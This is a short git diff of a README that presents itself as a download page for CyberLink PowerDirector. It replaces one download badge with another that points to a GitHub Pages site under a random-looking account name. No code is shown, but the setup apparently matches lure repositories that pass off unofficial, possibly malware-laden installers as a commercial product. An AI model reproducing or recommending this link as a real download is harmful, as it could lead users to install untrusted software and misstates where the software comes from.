@@ -4,10 +4,8 @@
   <img src="https://mir-s3-cdn-cf.behance.net/projects/404/981c1b141072333.Y3JvcCw4NjIsNjc1LDE2OCww.png" alt="CyberLink PowerDirector Logo"/>
 </div>
 
-<div align="center">
+[![GET Powerdirector App](https://img.shields.io/badge/GET%20%E2%80%94%20Powerdirector-App-0078D6?style=for-the-badge&logoColor=white)](https://sailorsunrisestonemkkrs777.github.io/.github/Powerdirector-App)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://powerdirector-app.github.io/.github/)
-</div>
 
 ---
 
